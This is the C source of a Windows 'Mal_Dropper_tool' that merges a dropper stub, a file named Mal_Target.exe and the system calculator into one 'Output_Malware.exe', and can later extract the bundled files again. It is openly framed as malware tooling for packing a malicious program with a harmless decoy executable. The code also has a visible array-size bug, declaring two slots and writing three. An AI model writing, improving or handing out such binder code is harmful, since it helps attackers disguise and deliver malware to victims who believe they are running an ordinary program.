#include <stdio.h>
#include <windows.h>

#define Main_Title()                                                    \
    printf("######################################################\n"); \
    printf("##             Mal_Dropper_tool_v0.2                ##\n"); \
    printf("##                                                  ##\n"); \
    printf("##                            Developed by nam3z1p  ##\n"); \
    printf("##                                         2020.05  ##\n"); \
    printf("######################################################\n");

#define Menu()                                      \
    printf("\n[+] Usage : %s -M[-D]\n", argv[0]);   \
    printf("\n[-M, -D] \n");                        \
    printf("  -M              Files Merge Mode\n"); \
    printf("  -D              Files Distribution Mode\n");

#define FILESIZE 4

typedef struct _FILE
{
    LPTSTR contents;
    DWORD size;
} INFOFILE, *PINFOFILE;

typedef struct _FILEDATA
{
    DWORD sizeCnt;
    PDWORD pSizeData;
    PBYTE *pData;
} FILEDATA, *PFILEDATA;

PINFOFILE GetFileInfo(LPCTSTR fileName)
{
    HANDLE hRead;
    PINFOFILE pInfoFile;
    DWORD nRead;

    pInfoFile = malloc(sizeof(INFOFILE));

    hRead = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hRead == INVALID_HANDLE_VALUE)
    {
        printf("[!] hRead CreateFile Error\n");
        return NULL;
    }

    pInfoFile->size = GetFileSize(hRead, NULL);
    pInfoFile->contents = (char *)malloc(pInfoFile->size);
    ReadFile(hRead, pInfoFile->contents, pInfoFile->size, &nRead, NULL);

    CloseHandle(hRead);
    return pInfoFile;
}

void MergeFile(LPCTSTR fileName, PINFOFILE *pInfoFile)
{
    HANDLE hWrite;
    DWORD nWrite, i, fileCnt = 3;
    char *fileSize;

    hWrite = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);

    if (hWrite == INVALID_HANDLE_VALUE)
        printf("[!] hWrite CreateFile Error\n");

    fileSize = (char *)malloc(FILESIZE * (fileCnt + 1));

    for (i = 0; i < 3; i++)
    {
        WriteFile(hWrite, pInfoFile[i]->contents, pInfoFile[i]->size, &nWrite, NULL);
        memcpy(fileSize + (i * FILESIZE), &pInfoFile[i]->size, FILESIZE);
        free(pInfoFile[i]->contents);
        free(pInfoFile[i]);
    }

    memcpy(fileSize + (i * FILESIZE), &fileCnt, FILESIZE);
    WriteFile(hWrite, fileSize, FILESIZE * (fileCnt + 1), &nWrite, NULL);

    free(fileSize);
    CloseHandle(hWrite);
}

void GetFileContents(HANDLE hRead, PFILEDATA pFileData)
{
    DWORD nRead, i;
    pFileData->pData = (PBYTE *)malloc(sizeof(PBYTE) * pFileData->sizeCnt);

    for (i = 0; i < pFileData->sizeCnt; i++)
    {
        pFileData->pData[i] = (BYTE *)malloc(sizeof(BYTE) * pFileData->pSizeData[i]);
        ReadFile(hRead, pFileData->pData[i], pFileData->pSizeData[i], &nRead, NULL);
    }
}

PFILEDATA GetSizeData(HANDLE hRead)
{
    PFILEDATA pFileData;
    DWORD nRead;

    pFileData = malloc(sizeof(FILEDATA));
    SetFilePointer(hRead, -4, 0, FILE_END);
    ReadFile(hRead, &pFileData->sizeCnt, 4, &nRead, NULL);
    pFileData->pSizeData = (DWORD *)malloc(sizeof(DWORD) * pFileData->sizeCnt);

    for (int i = pFileData->sizeCnt - 1; i >= 0; i--)
    {
        SetFilePointer(hRead, -8, 0, FILE_CURRENT);
        ReadFile(hRead, &pFileData->pSizeData[i], 4, &nRead, NULL);
    }

    SetFilePointer(hRead, 0, 0, FILE_BEGIN);
    return pFileData;
}

void ClearHandle(HANDLE hRead, PFILEDATA pFileData)
{
    for (int i = 0; i < pFileData->sizeCnt; i++)
    {
        free(pFileData->pData[i]);
    }
    free(pFileData->pSizeData);
    free(pFileData->pData);
    free(pFileData);
    CloseHandle(hRead);
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        Menu();
        return 0;
    }
    else
        Main_Title();

    HANDLE hRead, hWrite;
    PFILEDATA pFileData;
    PINFOFILE pInfoFile[2];
    DWORD nWrite, i, option = 0;

    char fileName[4][256], systemPath[256], currentPath[256];
    GetSystemDirectory(systemPath, 256);
    GetCurrentDirectory(256, currentPath);

    if (!strcmp(argv[1], "-M"))
    {
        sprintf(fileName[0], "%s\\Mal_Dropper_main.exe", currentPath);
        sprintf(fileName[1], "%s\\Mal_Target.exe", currentPath);
        sprintf(fileName[2], "%s\\calc.exe", systemPath);
        sprintf(fileName[3], "%s\\Output_Malware.exe", currentPath);
        printf("######################################################\n");
        for (int i = 0; i < 3; i++)
        {
            if (!(pInfoFile[i] = GetFileInfo(fileName[i])))
            {
                printf("[!] %s Not Found File !!", fileName[i]);
                return 0;
            }
            printf("[+] Target-%s\n", fileName[i]);
        }
        printf("######################################################\n");
        MergeFile(fileName[3], pInfoFile);
        printf("[+] Output-%s\n", fileName[3]);
        printf("######################################################\n");
    }
    else if (!strcmp(argv[1], "-D"))
    {
        sprintf(fileName[0], "%s\\Output_Malware.exe", currentPath);
        sprintf(fileName[1], "%s\\Mal_Target.exe", currentPath);
        sprintf(fileName[2], "%s\\calc.exe", currentPath);

        hRead = CreateFileA(fileName[0], GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hRead == INVALID_HANDLE_VALUE)
            printf("[!] hRead CreateFile Error\n");

        printf("######################################################\n");
        printf("[+] Target-%s\n", fileName[0]);
        pFileData = GetSizeData(hRead);
        GetFileContents(hRead, pFileData);
        printf("######################################################\n");

        for (i = 1; i < 3; i++)
        {
            hWrite = CreateFileA(fileName[i], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
            if (hWrite == INVALID_HANDLE_VALUE)
                printf("[!] hWrite CreateFile Error\n");
            WriteFile(hWrite, pFileData->pData[i], pFileData->pSizeData[i], &nWrite, NULL);
            CloseHandle(hWrite);
            printf("[+] Output-%s\n", fileName[i]);
        }
        printf("######################################################\n");
    }
    else
    {
        Menu();
        return 0;
    }
    printf("[+] Done\n");
    return 0;
}
